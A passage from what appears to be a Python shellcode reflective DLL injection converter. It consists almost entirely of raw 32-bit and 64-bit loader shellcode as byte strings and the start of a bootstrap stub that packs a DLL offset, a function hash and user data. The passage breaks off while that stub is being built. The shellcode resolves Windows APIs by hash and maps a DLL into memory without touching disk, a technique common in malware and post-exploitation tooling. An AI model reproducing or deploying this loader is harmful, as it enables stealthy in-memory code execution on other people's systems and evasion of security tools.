8B\x6C\x24\x28\x8B\xBC\x24\x28\x01\x00\x00\x83\xBD\x84\x00\x00\x00\x00\x0F\x84\xD7\x01\x00\x00\x8B\xB5\x80\x00\x00\x00\x33\xC0\x89\x44\x24\x10\x8D\x0C\x1E\x89\x4C\x24\x24\x83\xC1\x0C\x39\x01\x74\x0D\x8D\x49\x14\x40\x83\x39\x00\x75\xF7\x89\x44\x24\x10\x8B\x8C\x24\x38\x01\x00\x00\x8B\xD1\x83\xE2\x04\x89\x54\x24\x38\x8B\xD6\x0F\x84\xC3\x00\x00\x00\x83\xF8\x01\x0F\x86\xBA\x00\x00\x00\x83\xA4\x24\xBC\x00\x00\x00\x00\xC1\xE9\x10\x89\x8C\x24\x38\x01\x00\x00\x8D\x48\xFF\x89\x8C\x24\xC0\x00\x00\x00\x85\xC9\x0F\x84\xA1\x00\x00\x00\x8B\x74\x24\x24\x8B\xDE\x8B\xAC\x24\xBC\x00\x00\x00\x8B\xC8\x69\xFF\xFD\x43\x03\x00\x2B\xCD\x33\xD2\xB8\xFF\x7F\x00\x00\xF7\xF1\x81\xC7\xC3\x9E\x26\x00\x33\xD2\x89\xBC\x24\x28\x01\x00\x00\x6A\x05\x8D\x48\x01\x8B\xC7\xC1\xE8\x10\x8D\xBC\x24\xF0\x00\x00\x00\x25\xFF\x7F\x00\x00\xF7\xF1\x59\x03\xC5\x6B\xC0\x14\x6A\x05\x03\xC6\x45\x8B\xF0\xF3\xA5\x59\x8B\xF3\x8B\xF8\x8B\x44\x24\x10\xF3\xA5\x6A\x05\x8B\xFB\x8D\xB4\x24\xF0\x00\x00\x00\x59\xF3\xA5\x8B\xBC\x24\x28\x01\x00\x00\x83\xC3\x14\x8B\x74\x24\x24\x3B\xAC\x24\xC0\x00\x00\x00\x72\x87\x8B\x6C\x24\x28\x8B\x5C\x24\x2C\x8B\x95\x80\x00\x00\x00\xEB\x0B\x8B\x44\x24\x38\x89\x84\x24\x38\x01\x00\x00\x8D\x3C\x1A\x8B\x47\x0C\x89\x7C\x24\x2C\x85\xC0\x0F\x84\xB8\x00\x00\x00\x03\xC3\x50\xFF\x94\x24\xB4\x00\x00\x00\x8B\xD0\x89\x54\x24\x1C\x8B\x37\x8B\x6F\x10\x03\xF3\x03\xEB\x8B\x0E\x85\xC9\x74\x60\x8B\x7C\x24\x30\x85\xC9\x79\x09\x0F\xB7\x06\x55\x50\x6A\x00\xEB\x36\x83\xC1\x02\x33\xC0\x03\xCB\x89\x8C\x24\xC0\x00\x00\x00\x38\x01\x74\x0E\x40\x41\x80\x39\x00\x75\xF9\x8B\x8C\x24\xC0\x00\x00\x00\x55\x66\x89\x44\x24\x18\x66\x89\x44\x24\x1A\x8D\x44\x24\x18\x6A\x00\x89\x4C\x24\x20\x50\x52\xFF\xD7\x83\xC6\x04\x83\xC5\x04\x8B\x0E\x85\xC9\x74\x06\x8B\x54\x24\x1C\xEB\xA8\x8B\x7C\x24\x2C\x83\x7C\x24\x38\x00\x74\x1C\x33\xC0\x40\x39\x44\x24\x10\x76\x13\x69\x84\x24\x38\x01\x00\x00\xE8\x03\x00\x00\x50\xFF\x94\x24\xB0\x00\x00\x00\x8B\x47\x20\x83\xC7\x14\x89\x7C\x24\x2C\x85\xC0\x0F\x85\x4C\xFF\xFF\xFF\x8B\x6C\x24\x28\x83\xBD\xE4\x00\x00\x00\x00\x0F\x84\xAD\x00\x00\x00\x8B\x85\xE0\x00\x00\x00\x83\xC0\x04\x03\xC3\x89\x44\x24\x10\x8B\x00\x85\xC0\x0F\x84\x94\x00\x00\x00\x8B\x6C\x24\x10\x03\xC3\x50\xFF\x94\x24\xB4\x00\x00\x00\x8B\xC8\x89\x4C\x24\x1C\x8B\x75\x08\x8B\x7D\x0C\x03\xF3\x03\xFB\x83\x3E\x00\x74\x5B\x8B\x6C\x24\x30\x8B\x17\x85\xD2\x79\x09\x56\x0F\xB7\xC2\x50\x6A\x00\xEB\x30\x83\xC2\x02\x33\xC0\x03\xD3\x89\x54\x24\x38\x38\x02\x74\x0B\x40\x42\x80\x3A\x00\x75\xF9\x8B\x54\x24\x38\x56\x66\x89\x44\x24\x18\x66\x89\x44\x24\x1A\x8D\x44\x24\x18\x6A\x00\x89\x54\x24\x20\x50\x51\xFF\xD5\x83\xC6\x04\x83\xC7\x04\x83\x3E\x00\x74\x06\x8B\x4C\x24\x1C\xEB\xAD\x8B\x6C\x24\x10\x83\xC5\x20\x89\x6C\x24\x10\x8B\x45\x00\x85\xC0\x0F\x85\x74\xFF\xFF\xFF\x8B\x6C\x24\x28\x0F\xB7\x75\x14\x33\xC0\x83\xC6\x28\x33\xFF\x66\x3B\x45\x06\x0F\x83\xE5\x00\x00\x00\x03\xF5\xBA\x00\x00\x00\x40\x83\x3E\x00\x0F\x84\xC5\x00\x00\x00\x8B\x4E\x14\x8B\xC1\x25\x00\x00\x00\x20\x75\x0B\x85\xCA\x75\x07\x85\xC9\x78\x03\x40\xEB\x62\x85\xC0\x75\x30\x85\xCA\x75\x08\x85\xC9\x79\x04\x6A\x08\xEB\x51\x85\xC0\x75\x20\x85\xCA\x74\x08\x85\xC9\x78\x04\x6A\x02\xEB\x41\x85\xC0\x75\x10\x85\xCA\x74\x08\x85\xC9\x79\x04\x6A\x04\xEB\x31\x85\xC0\x74\x4A\x85\xCA\x75\x08\x85\xC9\x78\x04\x6A\x10\xEB\x21\x85\xC0\x74\x3A\x85\xCA\x75\x0B\x85\xC9\x79\x07\xB8\x80\x00\x00\x00\xEB\x0F\x85\xC0\x74\x27\x85\xCA\x74\x0D\x85\xC9\x78\x09\x6A\x20\x58\x89\x44\x24\x20\xEB\x1A\x85\xC0\x74\x12\x85\xCA\x74\x0E\x8B\x44\x24\x20\x85\xC9\x6A\x40\x5A\x0F\x48\xC2\xEB\xE4\x8B\x44\x24\x20\xF7\x46\x14\x00\x00\x00\x04\x74\x09\x0D\x00\x02\x00\x00\x89\x44\x24\x20\x8D\x4C\x24\x20\x51\x50\x8B\x46\xFC\xFF\x36\x03\xC3\x50\xFF\x94\x24\xC4\x00\x00\x00\xBA\x00\x00\x00\x40\x0F\xB7\x45\x06\x47\x83\xC6\x28\x3B\xF8\x0F\x82\x22\xFF\xFF\xFF\x6A\x00\x6A\x00\x6A\xFF\xFF\x94\x24\xC4\x00\x00\x00\x83\xBD\xC4\x00\x00\x00\x00\x74\x26\x8B\x85\xC0\x00\x00\x00\x8B\x74\x18\x0C\x8B\x06\x85\xC0\x74\x16\x33\xED\x45\x6A\x00\x55\x53\xFF\xD0\x8D\x76\x04\x8B\x06\x85\xC0\x75\xF1\x8B\x6C\x24\x28\x33\xC0\x40\x50\x50\x8B\x45\x28\x53\x03\xC3\xFF\xD0\x83\xBC\x24\x2C\x01\x00\x00\x00\x0F\x84\xAB\x00\x00\x00\x83\x7D\x7C\x00\x0F\x84\xA1\x00\x00\x00\x8B\x55\x78\x03\xD3\x8B\x6A\x18\x85\xED\x0F\x84\x91\x00\x00\x00\x83\x7A\x14\x00\x0F\x84\x87\x00\x00\x00\x8B\x7A\x20\x8B\x4A\x24\x03\xFB\x83\x64\x24\x30\x00\x03\xCB\x85\xED\x74\x74\x8B\x37\xC7\x44\x24\x10\x00\x00\x00\x00\x03\xF3\x74\x66\x8A\x06\x84\xC0\x74\x1A\x8B\x6C\x24\x10\x0F\xBE\xC0\x03\xE8\xC1\xCD\x0D\x46\x8A\x06\x84\xC0\x75\xF1\x89\x6C\x24\x10\x8B\x6A\x18\x8B\x84\x24\x2C\x01\x00\x00\x3B\x44\x24\x10\x75\x04\x85\xC9\x75\x15\x8B\x44\x24\x30\x83\xC7\x04\x40\x83\xC1\x02\x89\x44\x24\x30\x3B\xC5\x72\xAE\xEB\x20\x0F\xB7\x09\x8B\x42\x1C\xFF\xB4\x24\x34\x01\x00\x00\xFF\xB4\x24\x34\x01\x00\x00\x8D\x04\x88\x8B\x04\x18\x03\xC3\xFF\xD0\x59\x59\x8B\xC3\xEB\x02\x33\xC0\x5F\x5E\x5D\x5B\x81\xC4\x14\x01\x00\x00\xC3\x83\xEC\x14\x64\xA1\x30\x00\x00\x00\x53\x55\x56\x8B\x40\x0C\x57\x89\x4C\x24\x1C\x8B\x78\x0C\xE9\xA5\x00\x00\x00\x8B\x47\x30\x33\xF6\x8B\x5F\x2C\x8B\x3F\x89\x44\x24\x10\x8B\x42\x3C\x89\x7C\x24\x14\x8B\x6C\x10\x78\x89\x6C\x24\x18\x85\xED\x0F\x84\x80\x00\x00\x00\xC1\xEB\x10\x33\xC9\x85\xDB\x74\x2F\x8B\x7C\x24\x10\x0F\xBE\x2C\x0F\xC1\xCE\x0D\x80\x3C\x0F\x61\x89\x6C\x24\x10\x7C\x09\x8B\xC5\x83\xC0\xE0\x03\xF0\xEB\x04\x03\x74\x24\x10\x41\x3B\xCB\x72\xDD\x8B\x7C\x24\x14\x8B\x6C\x24\x18\x8B\x44\x2A\x20\x33\xDB\x8B\x4C\x2A\x18\x03\xC2\x89\x4C\x24\x10\x85\xC9\x74\x34\x8B\x38\x33\xED\x03\xFA\x83\xC0\x04\x89\x44\x24\x20\x8A\x0F\xC1\xCD\x0D\x0F\xBE\xC1\x03\xE8\x47\x84\xC9\x75\xF1\x8B\x7C\x24\x14\x8D\x04\x2E\x3B\x44\x24\x1C\x74\x20\x8B\x44\x24\x20\x43\x3B\x5C\x24\x10\x72\xCC\x8B\x57\x18\x85\xD2\x0F\x85\x50\xFF\xFF\xFF\x33\xC0\x5F\x5E\x5D\x5B\x83\xC4\x14\xC3\x8B\x74\x24\x18\x8B\x44\x16\x24\x8D\x04\x58\x0F\xB7\x0C\x10\x8B\x44\x16\x1C\x8D\x04\x88\x8B\x04\x10\x03\xC2\xEB\xDB'
    rdiShellcode64 = b'\x48\x8B\xC4\x48\x89\x58\x08\x44\x89\x48\x20\x4C\x89\x40\x18\x89\x50\x10\x55\x56\x57\x41\x54\x41\x55\x41\x56\x41\x57\x48\x8D\x6C\x24\x90\x48\x81\xEC\x70\x01\x00\x00\x45\x33\xFF\xC7\x45\xD8\x6B\x00\x65\x00\x48\x8B\xF1\x4C\x89\x7D\xF8\xB9\x13\x9C\xBF\xBD\x4C\x89\x7D\xC8\x4C\x89\x7D\x08\x45\x8D\x4F\x65\x4C\x89\x7D\x10\x44\x88\x4D\xBC\x44\x88\x4D\xA2\x4C\x89\x7D\x00\x4C\x89\x7D\xF0\x4C\x89\x7D\x18\x44\x89\x7D\x24\x44\x89\x7C\x24\x2C\xC7\x45\xDC\x72\x00\x6E\x00\xC7\x45\xE0\x65\x00\x6C\x00\xC7\x45\xE4\x33\x00\x32\x00\xC7\x45\xE8\x2E\x00\x64\x00\xC7\x45\xEC\x6C\x00\x6C\x00\xC7\x44\x24\x40\x53\x6C\x65\x65\xC6\x44\x24\x44\x70\xC7\x44\x24\x58\x4C\x6F\x61\x64\xC7\x44\x24\x5C\x4C\x69\x62\x72\xC7\x44\x24\x60\x61\x72\x79\x41\xC7\x44\x24\x48\x56\x69\x72\x74\xC7\x44\x24\x4C\x75\x61\x6C\x41\xC7\x44\x24\x50\x6C\x6C\x6F\x63\xC7\x44\x24\x68\x56\x69\x72\x74\xC7\x44\x24\x6C\x75\x61\x6C\x50\xC7\x44\x24\x70\x72\x6F\x74\x65\x66\xC7\x44\x24\x74\x63\x74\xC7\x45\xA8\x46\x6C\x75\x73\xC7\x45\xAC\x68\x49\x6E\x73\xC7\x45\xB0\x74\x72\x75\x63\xC7\x45\xB4\x74\x69\x6F\x6E\xC7\x45\xB8\x43\x61\x63\x68\xC7\x44\x24\x78\x47\x65\x74\x4E\xC7\x44\x24\x7C\x61\x74\x69\x76\xC7\x45\x80\x65\x53\x79\x73\xC7\x45\x84\x74\x65\x6D\x49\x66\xC7\x45\x88\x6E\x66\xC6\x45\x8A\x6F\xC7\x45\x90\x52\x74\x6C\x41\xC7\x45\x94\x64\x64\x46\x75\xC7\x45\x98\x6E\x63\x74\x69\xC7\x45\x9C\x6F\x6E\x54\x61\x66\xC7\x45\xA0\x62\x6C\xE8\x7F\x08\x00\x00\xB9\xB5\x41\xD9\x5E\x48\x8B\xD8\xE8\x72\x08\x00\x00\x4C\x8B\xE8\x48\x89\x45\xD0\x48\x8D\x45\xD8\xC7\x45\x20\x18\x00\x18\x00\x4C\x8D\x4C\x24\x38\x48\x89\x45\x28\x4C\x8D\x45\x20\x33\xD2\x33\xC9\xFF\xD3\x48\x8B\x4C\x24\x38\x48\x8D\x44\x24\x48\x45\x33\xC0\x48\x89\x44\x24\x30\x4C\x8D\x4D\xC8\xC7\x44\x24\x28\x0C\x00\x0C\x00\x48\x8D\x54\x24\x28\x41\xFF\xD5\x48\x8B\x4C\x24\x38\x48\x8D\x44\x24\x68\x45\x33\xC0\x48\x89\x44\x24\x30\x4C\x8D\x4D\x00\xC7\x44\x24\x28\x0E\x00\x0E\x00\x48\x8D\x54\x24\x28\x41\xFF\xD5\x48\x8D\x45\xA8\xC7\x44\x24\x28\x15\x00\x15\x00\x48\x8B\x4C\x24\x38\x4C\x8D\x4D\x08\x45\x33\xC0\x48\x89\x44\x24\x30\x48\x8D\x54\x24\x28\x41\xFF\xD5\x48\x8B\x4C\x24\x38\x48\x8D\x44\x24\x78\x45\x33\xC0\x48\x89\x44\x24\x30\x4C\x8D\x4D\x10\xC7\x44\x24\x28\x13\x00\x13\x00\x48\x8D\x54\x24\x28\x41\xFF\xD5\x48\x8B\x4C\x24\x38\x48\x8D\x44\x24\x40\x45\x33\xC0\x48\x89\x44\x24\x30\x4C\x8D\x4D\xF0\xC7\x44\x24\x28\x05\x00\x05\x00\x48\x8D\x54\x24\x28\x41\xFF\xD5\x48\x8B\x4C\x24\x38\x48\x8D\x45\x90\x45\x33\xC0\x48\x89\x44\x24\x30\x4C\x8D\x4D\x18\xC7\x44\x24\x28\x13\x00\x13\x00\x48\x8D\x54\x24\x28\x41\xFF\xD5\x48\x8B\x4C\x24\x38\x48\x8D\x44\x24\x58\x45\x33\xC0\x48\x89\x44\x24\x30\x4C\x8D\x4D\xF8\xC7\x44\x24\x28\x0C\x00\x0C\x00\x48\x8D\x54\x24\x28\x41\xFF\xD5\x4C\x39\x7D\xC8\x0F\x84\x1D\x07\x00\x00\x4C\x39\x7D\x00\x0F\x84\x13\x07\x00\x00\x4C\x39\x7D\xF0\x0F\x84\x09\x07\x00\x00\x4C\x39\x7D\x08\x0F\x84\xFF\x06\x00\x00\x48\x8B\x55\x10\x48\x85\xD2\x0F\x84\xF2\x06\x00\x00\x48\x63\x7E\x3C\x48\x03\xFE\x81\x3F\x50\x45\x00\x00\x0F\x85\xDF\x06\x00\x00\xB8\x64\x86\x00\x00\x66\x39\x47\x04\x0F\x85\xD0\x06\x00\x00\x45\x8D\x4F\x01\x44\x84\x4F\x38\x0F\x85\xC2\x06\x00\x00\x0F\xB7\x4F\x14\x41\x8B\xDF\x48\x83\xC1\x24\x66\x44\x3B\x7F\x06\x73\x25\x44\x0F\xB7\x47\x06\x48\x03\xCF\x44\x39\x79\x04\x8B\x47\x38\x0F\x45\x41\x04\x03\x01\x48\x8D\x49\x28\x3B\xC3\x0F\x46\xC3\x8B\xD8\x4D\x2B\xC1\x75\xE3\x48\x8D\x4D\x38\xFF\xD2\x8B\x55\x3C\x44\x8B\xC2\x44\x8D\x72\xFF\xF7\xDA\x44\x03\x77\x50\x49\x8D\x48\xFF\x8B\xC2\x4C\x23\xF0\x8B\xC3\x48\x03\xC8\x49\x8D\x40\xFF\x48\xF7\xD0\x48\x23\xC8\x4C\x3B\xF1\x0F\x85\x54\x06\x00\x00\x48\x8B\x4F\x30\x41\xBC\x00\x30\x00\x00\x45\x8B\xC4\x41\xB9\x04\x00\x00\x00\x49\x8B\xD6\xFF\x55\xC8\x48\x8B\xD8\x48\x85\xC0\x75\x12\x44\x8D\x48\x04\x45\x8B\xC4\x49\x8B\xD6\x33\xC9\xFF\x55\xC8\x48\x8B\xD8\x44\x8B\xA5\xD0\x00\x00\x00\x41\xBB\x01\x00\x00\x00\x45\x84\xE3\x74\x1D\x8B\x46\x3C\x89\x43\x3C\x8B\x56\x3C\xEB\x0B\x8B\xCA\x41\x03\xD3\x8A\x04\x31\x88\x04\x19\x3B\x57\x54\x72\xF0\xEB\x19\x41\x8B\xD7\x44\x39\x7F\x54\x76\x10\x8B\xCA\x41\x03\xD3\x8A\x04\x31\x88\x04\x19\x3B\x57\x54\x72\xF0\x48\x63\x7B\x3C\x45\x8B\xD7\x48\x03\xFB\x48\x89\x7D\x30\x44\x0F\xB7\x47\x14\x49\x83\xC0\x28\x66\x44\x3B\x7F\x06\x73\x3A\x4C\x03\xC7\x45\x8B\xCF\x45\x39\x38\x76\x1F\x41\x8B\x50\x04\x41\x8B\x48\xFC\x41\x8B\xC1\x45\x03\xCB\x48\x03\xC8\x48\x03\xD0\x8A\x04\x32\x88\x04\x19\x45\x3B\x08\x72\xE1\x0F\xB7\x47\x06\x45\x03\xD3\x49\x83\xC0\x28\x44\x3B\xD0\x72\xC9\x4C\x8B\xF3\x41\xB8\x02\x00\x00\x00\x4C\x2B\x77\x30\x0F\x84\xD6\x00\x00\x00\x44\x39\xBF\xB4\x00\x00\x00\x0F\x84\xC9\x00\x00\x00\x44\x8B\x8F\xB0\x00\x00\x00\x4C\x03\xCB\x45\x39\x39\x0F\x84\xB6\x00\x00\x00\x4D\x8D\x51\x08\xE9\x91\x00\x00\x00\x45\x0F\xB7\x1A\x41\x0F\xB7\xCB\x41\x0F\xB7\xC3\x66\xC1\xE9\x0C\x66\x83\xF9\x0A\x75\x29\x45\x8B\x01\x41\x81\xE3\xFF\x0F\x00\x00\x4B\x8D\x04\x18\x48\x8B\x14\x18\x4B\x8D\x04\x18\x41\xBB\x01\x00\x00\x00\x49\x03\xD6\x48\x89\x14\x18\x45\x8D\x43\x01\xEB\x4F\x41\xBB\x01\x00\x00\x00\x66\x83\xF9\x03\x75\x0E\x25\xFF\x0F\x00\x00\x48\x8D\x0C\x03\x41\x8B\xC6\xEB\x2E\x66\x41\x3B\xCB\x75\x15\x25\xFF\x0F\x00\x00\x48\x8D\x0C\x03\x49\x8B\xC6\x48\xC1\xE8\x10\x0F\xB7\xC0\xEB\x13\x66\x41\x3B\xC8\x75\x14\x25\xFF\x0F\x00\x00\x48\x8D\x0C\x03\x41\x0F\xB7\xC6\x41\x8B\x11\x48\x01\x04\x0A\x4D\x03\xD0\x41\x8B\x41\x04\x49\x03\xC1\x4C\x3B\xD0\x0F\x85\x5F\xFF\xFF\xFF\x4D\x8B\xCA\x45\x39\x3A\x0F\x85\x4A\xFF\xFF\xFF\x44\x39\xBF\x94\x00\x00\x00\x0F\x84\x82\x01\x00\x00\x8B\x8F\x90\x00\x00\x00\x45\x8B\xEF\x4C\x8D\x04\x19\x49\x8D\x40\x0C\xEB\x07\x45\x03\xEB\x48\x8D\x40\x14\x44\x39\x38\x75\xF4\x41\x8B\xC4\x83\xE0\x04\x89\x45\xC0\x8B\xC1\x0F\x84\x89\x00\x00\x00\x45\x3B\xEB\x0F\x86\x80\x00\x00\x00\x41\xC1\xEC\x10\x45\x8D\x5D\xFF\x45\x8B\xD7\x45\x85\xDB\x74\x74\x4D\x8B\xC8\x41\xBE\xFF\x7F\x00\x00\x41\x0F\x10\x01\x33\xD2\x41\x8B\xCD\x41\x2B\xCA\x69\xF6\xFD\x43\x03\x00\x41\x8B\xC6\xF7\xF1\x33\xD2\x81\xC6\xC3\x9E\x26\x00\x8D\x48\x01\x8B\xC6\xC1\xE8\x10\x41\x23\xC6\xF7\xF1\x41\x03\xC2\x41\xFF\xC2\x48\x8D\x0C\x80\x41\x8B\x54\x88\x10\x41\x0F\x10\x0C\x88\x41\x0F\x11\x04\x88\x41\x8B\x41\x10\x41\x89\x44\x88\x10\x41\x0F\x11\x09\x41\x89\x51\x10\x4D\x8D\x49\x14\x45\x3B\xD3\x72\xA1\x8B\x87\x90\x00\x00\x00\xEB\x04\x44\x8B\x65\xC0\x8B\xF0\x48\x03\xF3\x8B\x46\x0C\x85\xC0\x0F\x84\xB1\x00\x00\x00\x8B\x7D\xC0\x8B\xC8\x48\x03\xCB\xFF\x55\xF8\x48\x89\x44\x24\x38\x4C\x8B\xD0\x44\x8B\x36\x44\x8B\x7E\x10\x4C\x03\xF3\x4C\x03\xFB\x49\x8B\x0E\x48\x85\xC9\x74\x5F\x48\x85\xC9\x79\x08\x45\x0F\xB7\x06\x33\xD2\xEB\x32\x48\x8D\x53\x02\x33\xC0\x48\x03\xD1\x38\x02\x74\x0E\x48\x8B\xCA\x48\xFF\xC1\x48\xFF\xC0\x80\x39\x00\x75\xF5\x48\x89\x54\x24\x30\x45\x33\xC0\x48\x8D\x54\x24\x28\x66\x89\x44\x24\x28\x66\x89\x44\x24\x2A\x4D\x8B\xCF\x49\x8B\xCA\xFF\x55\xD0\x49\x83\xC6\x08\x49\x83\xC7\x08\x49\x8B\x0E\x48\x85\xC9\x74\x07\x4C\x8B\x54\x24\x38\xEB\xA1\x45\x33\xFF\x85\xFF\x74\x10\x41\x83\xFD\x01\x76\x0A\x41\x69\xCC\xE8\x03\x00\x00\xFF\x55\xF0\x8B\x46\x20\x48\x83\xC6\x14\x85\xC0\x0F\x85\x56\xFF\xFF\xFF\x48\x8B\x7D\x30\x4C\x8B\x6D\xD0\x44\x39\xBF\xF4\x00\x00\x00\x0F\x84\xA9\x00\x00\x00\x44\x8B\xBF\xF0\x00\x00\x00\x49\x83\xC7\x04\x4C\x03\xFB\x45\x33\xE4\x41\x8B\x07\x85\xC0\x0F\x84\x8A\x00\x00\x00\x8B\xC8\x48\x03\xCB\xFF\x55\xF8\x48\x89\x44\x24\x38\x48\x8B\xC8\x41\x8B\x77\x08\x45\x8B\x77\x0C\x48\x03\xF3\x4C\x03\xF3\x4C\x39\x26\x74\x5E\x49\x8B\x16\x48\x85\xD2\x79\x08\x44\x0F\xB7\xC2\x33\xD2\xEB\x34\x4C\x8D\x43\x02\x49\x8B\xC4\x4C\x03\xC2\x45\x38\x20\x74\x0E\x49\x8B\xD0\x48\xFF\xC2\x48\xFF\xC0\x44\x38\x22\x75\xF5\x4C\x89\x44\x24\x30\x48\x8D\x54\x24\x28\x45\x33\xC0\x66\x89\x44\x24\x28\x66\x89\x44\x24\x2A\x4C\x8B\xCE\x41\xFF\xD5\x48\x83\xC6\x08\x49\x83\xC6\x08\x4C\x39\x26\x74\x07\x48\x8B\x4C\x24\x38\xEB\xA2\x49\x83\xC7\x20\xE9\x6B\xFF\xFF\xFF\x45\x33\xFF\x0F\xB7\x77\x14\x45\x8B\xF7\x48\x83\xC6\x28\x41\xBC\x01\x00\x00\x00\x66\x44\x3B\x7F\x06\x0F\x83\x0B\x01\x00\x00\x48\x03\xF7\x44\x39\x3E\x0F\x84\xEB\x00\x00\x00\x8B\x46\x14\x8B\xC8\x81\xE1\x00\x00\x00\x20\x75\x17\x0F\xBA\xE0\x1E\x72\x11\x85\xC0\x78\x0D\x45\x8B\xC4\x44\x89\x64\x24\x20\xE9\xA4\x00\x00\x00\x85\xC9\x75\x3C\x0F\xBA\xE0\x1E\x72\x0A\x85\xC0\x79\x06\x44\x8D\x41\x08\xEB\x68\x85\xC9\x75\x28\x0F\xBA\xE0\x1E\x73\x0A\x85\xC0\x78\x06\x44\x8D\x41\x02\xEB\x54\x85\xC9\x75\x14\x0F\xBA\xE0\x1E\x73\x0A\x85\xC0\x79\x06\x44\x8D\x41\x04\xEB\x40\x85\xC9\x74\x5F\x0F\xBA\xE0\x1E\x72\x0C\x85\xC0\x78\x08\x41\xB8\x10\x00\x00\x00\xEB\x2A\x85\xC9\x74\x49\x0F\xBA\xE0\x1E\x72\x0C\x85\xC0\x79\x08\x41\xB8\x80\x00\x00\x00\xEB\x14\x85\xC9\x74\x33\x0F\xBA\xE0\x1E\x73\x11\x85\xC0\x78\x0D\x41\xB8\x20\x00\x00\x00\x44\x89\x44\x24\x20\xEB\x21\x85\xC9\x74\x18\x0F\xBA\xE0\x1E\x73\x12\x44\x8B\x44\x24\x20\x85\xC0\xB9\x40\x00\x00\x00\x44\x0F\x48\xC1\xEB\xDD\x44\x8B\x44\x24\x20\xF7\x46\x14\x00\x00\x00\x04\x74\x0A\x41\x0F\xBA\xE8\x09\x44\x89\x44\x24\x20\x8B\x4E\xFC\x4C\x8D\x4C\x24\x20\x8B\x16\x48\x03\xCB\xFF\x55\x00\x0F\xB7\x47\x06\x45\x03\xF4\x48\x83\xC6\x28\x44\x3B\xF0\x0F\x82\xF8\xFE\xFF\xFF\x45\x33\xC0\x33\xD2\x48\x83\xC9\xFF\xFF\x55\x08\x44\x39\xBF\xD4\x00\x00\x00\x74\x24\x8B\x87\xD0\x00\x00\x00\x48\x8B\x74\x18\x18\xEB\x0F\x45\x33\xC0\x41\x8B\xD4\x48\x8B\xCB\xFF\xD0\x48\x8D\x76\x08\x48\x8B\x06\x48\x85\xC0\x75\xE9\x4C\x8B\x4D\x18\x4D\x85\xC9\x74\x2F\x8B\x87\xA4\x00\x00\x00\x85\xC0\x74\x25\x8B\xC8\x4C\x8B\xC3\x48\xB8\xAB\xAA\xAA\xAA\xAA\xAA\xAA\xAA\x48\xF7\xE1\x8B\x8F\xA0\x00\x00\x00\x48\xC1\xEA\x03\x48\x03\xCB\x41\x2B\xD4\x41\xFF\xD1\x8B\x47\x28\x4D\x8B\xC4\x48\x03\xC3\x41\x8B\xD4\x48\x8B\xCB\xFF\xD0\x8B\xB5\xB8\x00\x00\x00\x85\xF6\x0F\x84\x97\x00\x00\x00\x44\x39\xBF\x8C\x00\x00\x00\x0F\x84\x8A\x00\x00\x00\x8B\x8F\x88\x00\x00\x00\x48\x03\xCB\x44\x8B\x59\x18\x45\x85\xDB\x74\x78\x44\x39\x79\x14\x74\x72\x44\x8B\x49\x20\x41\x8B\xFF\x8B\x51\x24\x4C\x03\xCB\x48\x03\xD3\x45\x85\xDB\x74\x5D\x45\x8B\x01\x45\x8B\xD7\x4C\x03\xC3\x74\x52\xEB\x0D\x0F\xBE\xC0\x44\x03\xD0\x41\xC1\xCA\x0D\x4D\x03\xC4\x41\x8A\x00\x84\xC0\x75\xEC\x41\x3B\xF2\x75\x05\x48\x85\xD2\x75\x12\x41\x03\xFC\x49\x83\xC1\x04\x48\x83\xC2\x02\x41\x3B\xFB\x73\x22\xEB\xC3\x8B\x41\x1C\x0F\xB7\x0A\x48\x03\xC3\x8B\x95\xC8\x00\x00\x00\x44\x8B\x04\x88\x48\x8B\x8D\xC0\x00\x00\x00\x4C\x03\xC3\x41\xFF\xD0\x48\x8B\xC3\xEB\x02\x33\xC0\x48\x8B\x9C\x24\xB0\x01\x00\x00\x48\x81\xC4\x70\x01\x00\x00\x41\x5F\x41\x5E\x41\x5D\x41\x5C\x5F\x5E\x5D\xC3\xCC\x48\x8B\xC4\x48\x89\x58\x08\x48\x89\x68\x10\x48\x89\x70\x18\x48\x89\x78\x20\x41\x56\x48\x83\xEC\x10\x65\x48\x8B\x04\x25\x60\x00\x00\x00\x8B\xE9\x45\x33\xF6\x48\x8B\x50\x18\x4C\x8B\x4A\x10\x4D\x8B\x41\x30\x4D\x85\xC0\x0F\x84\xB3\x00\x00\x00\x41\x0F\x10\x41\x58\x49\x63\x40\x3C\x41\x8B\xD6\x4D\x8B\x09\xF3\x0F\x7F\x04\x24\x46\x8B\x9C\x00\x88\x00\x00\x00\x45\x85\xDB\x74\xD2\x48\x8B\x04\x24\x48\xC1\xE8\x10\x66\x44\x3B\xF0\x73\x22\x48\x8B\x4C\x24\x08\x44\x0F\xB7\xD0\x0F\xBE\x01\xC1\xCA\x0D\x80\x39\x61\x7C\x03\x83\xC2\xE0\x03\xD0\x48\xFF\xC1\x49\x83\xEA\x01\x75\xE7\x4F\x8D\x14\x18\x45\x8B\xDE\x41\x8B\x7A\x20\x49\x03\xF8\x45\x39\x72\x18\x76\x8E\x8B\x37\x41\x8B\xDE\x49\x03\xF0\x48\x8D\x7F\x04\x0F\xBE\x0E\x48\xFF\xC6\xC1\xCB\x0D\x03\xD9\x84\xC9\x75\xF1\x8D\x04\x13\x3B\xC5\x74\x0E\x41\xFF\xC3\x45\x3B\x5A\x18\x72\xD5\xE9\x5E\xFF\xFF\xFF\x41\x8B\x42\x24\x43\x8D\x0C\x1B\x49\x03\xC0\x0F\xB7\x14\x01\x41\x8B\x4A\x1C\x49\x03\xC8\x8B\x04\x91\x49\x03\xC0\xEB\x02\x33\xC0\x48\x8B\x5C\x24\x20\x48\x8B\x6C\x24\x28\x48\x8B\x74\x24\x30\x48\x8B\x7C\x24\x38\x48\x83\xC4\x10\x41\x5E\xC3'
    if is64BitDLL(dllBytes):
        rdiShellcode = rdiShellcode64
        bootstrap = b''
        bootstrapSize = 64
        bootstrap += b'\xe8\x00\x00\x00\x00'
        dllOffset = bootstrapSize - len(bootstrap) + len(rdiShellcode)
        bootstrap += b'\x59'
        bootstrap += b'\x49\x89\xc8'
        bootstrap += b'\x48\x81\xc1'
        bootstrap += struct.pack('I', dllOffset)
        bootstrap += b'\xba'
        bootstrap += struct.pack('I', functionHash)
        bootstrap += b'\x49\x81\xc0'
        userDataLocation = dllOffset + len(dllBytes)
        bootstrap += struct.pack('I', userDataLocation)
        bootstrap += b'\x41\xb9'
        bootstrap += struct.pack('I', len(userData))
        bootstrap += b'\x56'
        bootstrap += b'\x48\x89\xe6'
        bootstrap += b'\x48\x83\xe4\xf0'
        bootstrap += b'\x48\x83\xec'
        bootstrap += b'\x30'
        bootstrap += b'\xC7\x44\x24'
        bootstrap += b'\x20'
        bootstrap += struct.pack('I', asdflags)
        bootstrap += b'\xe8'
        bootstrap += struct.pack('b', bootstrapSize - len(bootstrap) - 4)
